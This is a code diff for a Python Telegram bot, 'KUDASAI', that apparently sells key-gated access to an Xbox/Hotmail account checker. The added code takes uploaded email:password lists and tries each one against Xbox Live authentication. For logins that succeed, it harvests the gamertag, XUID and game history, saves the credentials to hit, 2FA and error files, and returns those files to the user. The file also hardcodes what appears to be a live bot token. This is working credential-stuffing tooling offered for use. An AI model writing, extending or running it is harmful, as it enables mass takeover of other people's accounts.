@@ -2,11 +2,14 @@ import os
 import sqlite3
 import random
 import string
-import subprocess
 import asyncio
+import time
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
 from telegram.ext import ApplicationBuilder, MessageHandler, CallbackQueryHandler, CommandHandler, ContextTypes, filters
+from xbox.webapi.api.client import XboxLiveClient
+from xbox.webapi.authentication.manager import AuthenticationManager
+import httpx
 from colorama import init, Fore
 
 init(autoreset=True)
@@ -15,18 +18,13 @@ init(autoreset=True)
 TELEGRAM_BOT_TOKEN = "8658943714:AAEFCKM5eEzjrQSI4rUDH4dndRRQKmh36c4"
 OWNER_HANDLE = "@kudsoo"
 ADMIN_IDS = [8511482382]  # Your Admin Telegram ID
-
-# Absolute paths based on where bot.py is located
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-OUTPUT_DIR = os.path.join(BASE_DIR, "results_output")
-TOOL_RESULTS_FOLDER = os.path.join(BASE_DIR, "xbox_results")
+OUTPUT_DIR = "results_output"
 
 os.makedirs(OUTPUT_DIR, exist_ok=True)
-os.makedirs(TOOL_RESULTS_FOLDER, exist_ok=True)
 
 # DATABASE INITIALIZATION
 def init_db():
-    conn = sqlite3.connect(os.path.join(BASE_DIR, "bot_database.db"), check_same_thread=False)
+    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
     cursor = conn.cursor()
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS users (
@@ -51,7 +49,7 @@ def init_db():
 init_db()
 
 def db_query(query, params=(), fetch=None):
-    conn = sqlite3.connect(os.path.join(BASE_DIR, "bot_database.db"), check_same_thread=False)
+    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
     cursor = conn.cursor()
     cursor.execute(query, params)
     result = None
@@ -63,6 +61,7 @@ def db_query(query, params=(), fetch=None):
     conn.close()
     return result
 
+# STATS TRACKER
 bot_stats = {
     "total_processed": 0,
     "successful": 0,
@@ -72,78 +71,160 @@ bot_stats = {
 }
 
 print(Fore.RED + "==================================================")
-print(Fore.RED + " [KUDASAI] ABSOLUTE PATH CHECKER ENGINE ONLINE")
+print(Fore.RED + " [KUDASAI] LIVE PROGRESS BAR CHECKER ONLINE")
 print(Fore.RED + "==================================================\n")
 
-async def run_tool_checker(account_lines, chat_id, context: ContextTypes.DEFAULT_TYPE):
-    status_msg = await context.bot.send_message(chat_id=chat_id, text="⚡ **[KUDASAI]** Initializing encrypted tool execution...")
-
-    # Save accounts explicitly to the exact folder where .ninjapy lives
-    accounts_file_path = os.path.join(BASE_DIR, "accounts.txt")
-    with open(accounts_file_path, "w", encoding="utf-8") as f:
-        for line in account_lines:
-            f.write(line.strip() + "\n")
-
-    await status_msg.edit_text("⚡ **[KUDASAI]** Tool is checking accounts in the background...")
-
-    # Execute tool with absolute path context
+def log_to_file(filename, content):
     try:
-        ninja_path = os.path.join(BASE_DIR, ".ninjapy")
-        process = subprocess.Popen(
-            ["python3", ninja_path],
-            cwd=BASE_DIR,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        stdout_val, stderr_val = process.communicate(timeout=600) # 10 min timeout
-        print(Fore.CYAN + f"[DEBUG] Tool stdout: {stdout_val}")
-        if stderr_val:
-            print(Fore.YELLOW + f"[DEBUG] Tool stderr: {stderr_val}")
+        file_path = os.path.join(OUTPUT_DIR, filename)
+        with open(file_path, "a", encoding="utf-8") as f:
+            f.write(content + "\n")
     except Exception as e:
-        print(Fore.RED + f"[-] Execution exception: {str(e)}")
+        print(Fore.RED + f"[-] Error writing to {filename}: {str(e)}")
 
-    await status_msg.edit_text("🎯 **[KUDASAI]** Checking finished! Collecting hits from `xbox_results`...")
+def generate_progress_bar(current, total, length=10):
+    if total == 0:
+        filled = 0
+    else:
+        filled = int(round(length * current / float(total)))
+    bar = '█' * filled + '░' * (length - filled)
+    percentage = int(round((current / float(total)) * 100)) if total > 0 else 0
+    return f"[{bar}] {percentage}% ({current}/{total})"
 
-    sent_any = False
+async def process_accounts_with_progress(account_lines, chat_id, context: ContextTypes.DEFAULT_TYPE):
+    for file in ["results.txt", "2fa.txt", "errors.txt"]:
+        fp = os.path.join(OUTPUT_DIR, file)
+        if os.path.exists(fp):
+            os.remove(fp)
 
-    # Check xbox_results folder for hits
-    if os.path.exists(TOOL_RESULTS_FOLDER):
-        for filename in os.listdir(TOOL_RESULTS_FOLDER):
-            file_path = os.path.join(TOOL_RESULTS_FOLDER, filename)
-            if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
-                with open(file_path, "rb") as f:
-                    await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📁 Hit Result: {filename}")
-                sent_any = True
-                try:
-                    os.remove(file_path)
-                except Exception:
-                    pass
+    valid_accounts = []
+    for line in account_lines:
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        if ":" in line and "@" in line:
+            parts = line.split(":")
+            if len(parts) >= 2:
+                email = parts[0].strip()
+                password = parts[1].strip().split(" ")[0].split("\t")[0]
+                valid_accounts.append((email, password))
 
-    # Fallback check in root directory
-    for fallback in ["results.txt", "2fa.txt", "errors.txt", "hits.txt", "valid.txt", "checked.txt"]:
-        fb_path = os.path.join(BASE_DIR, fallback)
-        if os.path.exists(fb_path) and os.path.getsize(fb_path) > 0:
-            with open(fb_path, "rb") as f:
-                await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📁 Output: {fallback}")
-            sent_any = True
+    total = len(valid_accounts)
+    if total == 0:
+        await context.bot.send_message(chat_id=chat_id, text="❌ **[KUDASAI]** No valid `email:password` accounts detected in your input file.")
+        return
+
+    # Send initial progress message
+    status_msg = await context.bot.send_message(
+        chat_id=chat_id,
+        text=f"🚀 **[KUDASAI] XBOX CHECKER INITIALIZED**\n\n"
+             f"📊 Progress: `[░░░░░░░░░░] 0% (0/{total})`\n"
+             f"🎯 Hits Found: 0\n"
+             f"⏳ Current: Starting up..."
+    )
+
+    start_time = time.time()
+    hits = 0
+    processed = 0
+
+    async with httpx.AsyncClient() as client_http:
+        for email, password in valid_accounts:
+            processed += 1
+            bot_stats["total_processed"] += 1
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+            # Update live progress bar every 1 account or block
+            progress_str = generate_progress_bar(processed, total)
             try:
-                os.remove(fb_path)
+                await status_msg.edit_text(
+                    text=f"🚀 **[KUDASAI] CHECKING IN PROGRESS**\n\n"
+                         f"📊 Progress: `{progress_str}`\n"
+                         f"🎯 Hits Found: {hits}\n"
+                         f"📧 Checking: `{email}`",
+                    parse_mode="Markdown"
+                )
             except Exception:
                 pass
 
-    # Cleanup accounts file
-    if os.path.exists(accounts_file_path):
-        try:
-            os.remove(accounts_file_path)
-        except Exception:
-            pass
+            try:
+                auth_mgr = AuthenticationManager(client_http, client_id="", client_secret="", redirect_uri="")
+                await auth_mgr.authenticate(email, password)
+                
+                if not auth_mgr.authenticated:
+                    bot_stats["failed"] += 1
+                    log_to_file("errors.txt", f"[{timestamp}] REJECTED: {email}:{password}")
+                    continue
 
-    if not sent_any:
-        await context.bot.send_message(
-            chat_id=chat_id, 
-            text="ℹ️ Tool finished running, but no result files were found in `xbox_results`. Please verify if your tool requires a specific command-line argument (like file names) when run."
-        )
+                xbl_client = XboxLiveClient(
+                    userhash=auth_mgr.userinfo.userhash,
+                    auth_token=auth_mgr.xsts_token.jwt,
+                    xuid=auth_mgr.userinfo.xuid
+                )
+                
+                profile_resp = await xbl_client.profile.get_profile_by_xuid(auth_mgr.userinfo.xuid)
+                gamertag = "Unknown"
+                if profile_resp and 'profileUsers' in profile_resp:
+                    for user in profile_resp['profileUsers']:
+                        for setting in user.get('settings', []):
+                            if setting['id'] == 'GameDisplayName':
+                                gamertag = setting['value']
+
+                hits += 1
+                bot_stats["successful"] += 1
+
+                result_block = f"--- [{timestamp}] SUCCESS ---\n"
+                result_block += f"Email: {email}\n"
+                result_block += f"Password: {password}\n"
+                result_block += f"Gamertag: {gamertag}\n"
+                result_block += f"XUID: {auth_mgr.userinfo.xuid}\n"
+
+                try:
+                    titles_resp = await xbl_client.titlehub.get_title_history(auth_mgr.userinfo.xuid)
+                    result_block += "Owned / Recent Games:\n"
+                    if titles_resp and 'titles' in titles_resp:
+                        for title in titles_resp['titles'][:15]:
+                            result_block += f"  - {title.get('name', 'Unknown Title')} ({title.get('type', 'Unknown')})\n"
+                    else:
+                        result_block += "  - No public game history found.\n"
+                except Exception:
+                    pass
+
+                result_block += "=" * 40 + "\n"
+                log_to_file("results.txt", result_block)
+
+            except Exception as e:
+                bot_stats["failed"] += 1
+                error_message = str(e).lower()
+                if any(k in error_message for k in ["mfa", "2fa", "twofactor", "proof", "challenge", "captcha"]):
+                    log_to_file("2fa.txt", f"[{timestamp}] 2FA_REQUIRED: {email}:{password}")
+                else:
+                    log_to_file("errors.txt", f"[{timestamp}] ERROR: {email}:{password}")
+
+    elapsed = round(time.time() - start_time, 2)
+    
+    # Finalize progress status message
+    await status_msg.edit_text(
+        text=f"✅ **[KUDASAI] SCAN COMPLETED!**\n\n"
+             f"📊 Total Checked: {total}\n"
+             f"🎯 Hits Found: {hits}\n"
+             f"⏱️ Time Taken: {elapsed} seconds\n\n"
+             f"📁 Uploading reports...",
+        parse_mode="Markdown"
+    )
+
+    # Upload files back to user chat
+    for filename in ["results.txt", "2fa.txt", "errors.txt"]:
+        file_path = os.path.join(OUTPUT_DIR, filename)
+        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+            with open(file_path, "rb") as f:
+                await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📁 Report: {filename}")
+            try:
+                os.remove(file_path)
+            except Exception:
+                pass
+        else:
+            if os.path.exists(file_path):
+                os.remove(file_path)
 
 def get_main_menu(user_id):
     is_admin = user_id in ADMIN_IDS or db_query("SELECT is_admin FROM users WHERE user_id=?", (user_id,), "one")
@@ -269,7 +350,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not has_access:
             await query.message.reply_text("❌ Access Denied! Please redeem a key first using /redeem or the menu.")
             return
-        await query.message.reply_text("📥 **Send your accounts:** Send a `.txt` file or paste your `email:password` lines.")
+        await query.message.reply_text("📥 **Send your accounts:** Upload your `.txt` file containing your Hotmail accounts now.")
     elif data == "redeem_prompt":
         await query.message.reply_text("🔑 Send your key using command: `/redeem <KEY>`")
     elif data == "set_proxy":
@@ -410,13 +491,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             file_content = str(byte_array)
             
         lines = file_content.splitlines()
-        await run_tool_checker(lines, update.effective_chat.id, context)
+        await process_accounts_with_progress(lines, update.effective_chat.id, context)
         return
 
     text = update.message.text
     if text and not text.startswith("/"):
         lines = text.strip().splitlines()
-        await run_tool_checker(lines, update.effective_chat.id, context)
+        await process_accounts_with_progress(lines, update.effective_chat.id, context)
 
 def main():
     app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).post_init(set_bot_commands).build()
@@ -430,7 +511,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
 
-    print(Fore.GREEN + "[+] Kudasai Tool-Integrated Bot is online and running...")
+    print(Fore.GREEN + "[+] Kudasai Native Progress Checker Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
